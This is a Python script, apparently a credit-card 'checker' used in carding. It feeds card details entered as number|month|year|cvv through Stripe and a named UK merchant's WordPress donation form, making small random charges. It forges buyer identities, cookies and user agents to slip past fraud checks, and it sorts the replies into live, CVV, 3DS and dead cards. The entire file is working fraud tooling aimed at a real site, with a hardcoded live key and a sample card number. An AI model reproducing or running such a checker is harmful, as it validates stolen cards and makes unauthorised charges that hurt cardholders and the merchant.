import requests
import json
import time
import random
import uuid
from faker import Faker

fake = Faker("en_US")

# ========== COMPLETE CLASSIFICATION KEYS (from original) ==========
success_keys = ["appreciate", "appreciated", "Payment Success", "redirect_to", "thank", "Thanks", "Gracias", "Thank", "redirectUrl", "succeeded", "confirmation", "Successful!", "Thanks!", "Successful", "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!", "succeeded", "success", "approved", "charge", "paid", "complete"]
ccn_keys = ["security code is incorrect", "INCORRECT_CVV", "Your card number is incorrect", "invalid card number"]
invalid_keys = ["Invalid account", "Invalid card"]
declined_keys = ["cannot be processed", "CARD_DECLINED", "Your card was declined.", "generic_decline", "cannot process your order", "declined", "do_not_honor"]
cvv_keys = ["transaction_not_allowed", "Your card does not support this type of purchase", "do_not_honor", "security code is incorrect", "INCORRECT_CVV", "cvv", "cvc"]
insufficient_keys = ["Your card has insufficient funds.", "INSUFFICIENT_FUNDS", "insufficient_funds", "Insufficient Funds", "Insufficient"]
payment_failed_keys = ["does not match the billing address"]
expired_keys = ["card has expired", "expired", "exp_date"]
incorrect_keys = ["card number is incorrect"]
manycc_keys = ["Too Many Requests"]
riskcc_keys = ["again in a little bit"]
otp_keys = ["Verifying", "action_required", "verifying", "call_next_method", "requires_source_action", "CompletePaymentChallenge", "requires_action", "additional action before completion!", "nextAction", "3d_secure", "authentication_required", "verification", "redirect"]
cap_keys = ["reCaptcha"]
exceed_keys = ["exceeding its amount limit"]
proxyfailed_keys = ["Failed to perform"]

def classify_response(last):
    last_lower = last.lower()
    if any(key.lower() in last_lower for key in success_keys): 
        return "HIT", "HIT"
    if any(key.lower() in last_lower for key in ccn_keys): 
        return "CCN", "CCN"
    if any(key.lower() in last_lower for key in cvv_keys): 
        return "CVV", "CVV"
    if any(key.lower() in last_lower for key in otp_keys): 
        return "3DS", "3DS"
    if any(key.lower() in last_lower for key in insufficient_keys): 
        return "INSUFFICIENT", "LOW_FUND"
    if any(key.lower() in last_lower for key in expired_keys): 
        return "DEAD", "EXPIRED"
    if any(key.lower() in last_lower for key in declined_keys): 
        return "DEAD", "DECLINED"
    if any(key.lower() in last_lower for key in manycc_keys): 
        return "MANYCC", "MANYCC"
    if any(key.lower() in last_lower for key in riskcc_keys): 
        return "RISK", "RISK"
    if any(key.lower() in last_lower for key in cap_keys): 
        return "CAPTCHA", "CAPTCHA"
    if any(key.lower() in last_lower for key in exceed_keys): 
        return "EXCEED", "EXCEED"
    return "DEAD", last

def gen_random_user_agent():
    chrome_version = random.randint(120, 137)
    user_agents = [
        f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36 Edg/{chrome_version}.0.0.0",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    ]
    return random.choice(user_agents)

def gen_random_name():
    first_name = fake.first_name()
    last_name = fake.last_name()
    return first_name, last_name

def gen_random_email(first_name, last_name):
    domains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com", "@protonmail.com"]
    random_num = random.randint(1000, 99999)
    return f"{first_name.lower()}{random_num}{random.choice(domains)}"

def gen_random_guid():
    return f"{uuid.uuid4()}{random.randint(10000, 99999)}"

def gen_random_amount():
    """Generate random amount between $1.00 and $5.00 with 2 decimal places"""
    amount = round(random.uniform(1.00, 5.00), 2)
    return f"{amount:.2f}"

def Tele(ccx: str):
    """
    Check credit card via monarchcareuk.com with random amount
    Input: "card_number|month|year|cvv"
    """
    
    parts = ccx.strip().split("|")
    if len(parts) != 4:
        return "ERROR: Invalid format. Use: number|month|year|cvv", "0.00", "Error"
    
    n, mm, yy, cvc = parts
    
    # Fix year format
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:4]
    
    # Generate random amount between $1.00 and $5.00
    amount = gen_random_amount()
    gateway_name = f"MonarchCare UK (${amount})"
    
    # Generate random customer data
    first_name, last_name = gen_random_name()
    email = gen_random_email(first_name, last_name)
    full_name = f"{first_name} {last_name}"
    
    # Generate random IDs
    guid = gen_random_guid()
    muid = gen_random_guid()
    sid = gen_random_guid()
    client_session_id = gen_random_guid()
    wallet_config_id = "056a1bf8-d7e8-4d32-887c-7965252e595b"
    
    # Stripe publishable key for monarchcareuk.com
    stripe_key = "pk_live_51K6NoPGdie3QtZtYTPVL04kG3KaCqziqWzmChR5GrvLldqfHJQwhadsifZwlw7eEVSOjzqYhHs0WAKBXiK5QMAM300alarMxbt"
    
    session = requests.Session()
    
    # Set cookies
    session.cookies.set('__stripe_mid', muid)
    session.cookies.set('__stripe_sid', sid)
    session.cookies.set('_ga', f'GA1.1.{random.randint(1000000, 9999999)}.{int(time.time())}')
    session.cookies.set('cookie_notice_accepted', 'true')
    session.cookies.set('wc_visitor', f'157442-{uuid.uuid4()}')
    
    # ========== STEP 1: Create Payment Method ==========
    url_stripe = "https://api.stripe.com/v1/payment_methods"
    
    stripe_data = (
        f'type=card'
        f'&billing_details[name]={full_name.replace(" ", "+")}'
        f'&card[number]={n}'
        f'&card[cvc]={cvc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&guid={guid}'
        f'&muid={muid}'
        f'&sid={sid}'
        f'&pasted_fields=number'
        f'&payment_user_agent=stripe.js%2Fe5ebd5e1e6%3B+stripe-js-v3%2Fe5ebd5e1e6%3B+card-element'
        f'&referrer=https%3A%2F%2Fwww.monarchcareuk.com'
        f'&time_on_page={random.randint(10000, 80000)}'
        f'&client_attribution_metadata[client_session_id]={client_session_id}'
        f'&client_attribution_metadata[merchant_integration_source]=elements'
        f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
        f'&client_attribution_metadata[merchant_integration_version]=2017'
        f'&client_attribution_metadata[wallet_config_id]={wallet_config_id}'
        f'&key={stripe_key}'
    )
    
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': gen_random_user_agent(),
    }
    
    try:
        response = session.post(url_stripe, headers=headers_stripe, data=stripe_data, timeout=30)
    except requests.exceptions.RequestException as e:
        return f"NETWORK_ERROR: {str(e)}", amount, gateway_name
    
    if response.status_code != 200:
        try:
            error_json = response.json()
            error_msg = error_json.get('error', {}).get('message', response.text[:200])
            return f"STRIPE_ERROR: {error_msg}", amount, gateway_name
        except:
            return f"STRIPE_ERROR: {response.text[:200]}", amount, gateway_name
    
    try:
        response_json = response.json()
        if 'id' not in response_json:
            return f"NO_PAYMENT_METHOD_ID: {response.text[:200]}", amount, gateway_name
        payment_method_id = response_json['id']
    except Exception as e:
        return f"JSON_PARSE_ERROR: {str(e)}", amount, gateway_name
    
    # ========== STEP 2: Charge with Random Amount ==========
    url_wp = "https://www.monarchcareuk.com/wp-admin/admin-ajax.php"
    
    random_input = gen_random_email(first_name, last_name)
    
    wp_data = (
        f'action=wp_full_stripe_inline_donation_charge'
        f'&wpfs-form-name=MonarchCarePayment'
        f'&wpfs-form-get-parameters=%257B%257D'
        f'&wpfs-custom-amount=other'
        f'&wpfs-custom-amount-unique={amount}'
        f'&wpfs-donation-frequency=one-time'
        f'&wpfs-custom-input%5B%5D={random_input}'
        f'&wpfs-card-holder-email={email}'
        f'&wpfs-card-holder-name={full_name.replace(" ", "+")}'
        f'&wpfs-terms-of-use-accepted=1'
        f'&wpfs-stripe-payment-method-id={payment_method_id}'
    )
    
    headers_wp = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.monarchcareuk.com',
        'Referer': 'https://www.monarchcareuk.com/payments/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': gen_random_user_agent(),
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    try:
        r2 = session.post(url_wp, data=wp_data, headers=headers_wp, timeout=30)
    except requests.exceptions.RequestException as e:
        return f"WP_NETWORK_ERROR: {str(e)}", amount, gateway_name
    
    # Parse response with full classification
    try:
        response_json = r2.json()
        message = response_json.get('message', r2.text)
        
        status, detail = classify_response(message)
        
        if status == "HIT":
            return f"✅ APPROVED - Payment Successful! (${amount})", amount, gateway_name
        elif status == "CCN":
            return f"❌ CCN - Wrong card number", amount, gateway_name
        elif status == "CVV":
            return f"⚠️ CVV - Wrong CVV", amount, gateway_name
        elif status == "3DS":
            return f"🔐 3DS REQUIRED - {message}", amount, gateway_name
        elif status == "INSUFFICIENT":
            return f"💰 INSUFFICIENT FUNDS (${amount})", amount, gateway_name
        elif status == "EXPIRED":
            return f"📅 EXPIRED CARD", amount, gateway_name
        elif status == "MANYCC":
            return f"⏳ TOO MANY REQUESTS", amount, gateway_name
        elif status == "RISK":
            return f"⚠️ RISK - Try again later", amount, gateway_name
        elif status == "CAPTCHA":
            return f"🤖 CAPTCHA REQUIRED", amount, gateway_name
        elif status == "EXCEED":
            return f"📊 AMOUNT EXCEEDED", amount, gateway_name
        else:
            return f"❌ {message}", amount, gateway_name
            
    except:
        return r2.text, amount, gateway_name

if __name__ == "__main__":
    print("=" * 50)
    print("MonarchCare UK Stripe Checker (Random Amount $1-$5)")
    print("=" * 50)
    
    test_card = "5175469070922716|07|30|599"
    
    print(f"\n[+] Testing: {test_card}")
    print("-" * 50)
    
    result, amount, gateway = Tele(test_card)
    print(f"Result: {result}")
    print(f"Amount: ${amount}")
    print(f"Gateway: {gateway}")
    print("=" * 50)
    
    # Interactive mode
    print("\n[+] Interactive Mode")
    print("Enter card in format: number|month|year|cvv")
    print("Type 'exit' to quit\n")
    
    while True:
        card_input = input("Card: ").strip()
        if card_input.lower() == 'exit':
            break
        if not card_input:
            continue
            
        result, amount, gateway = Tele(card_input)
        print(f"Result: {result}")
        print(f"Amount: ${amount}")
        print(f"Gateway: {gateway}")
        print("-" * 50)
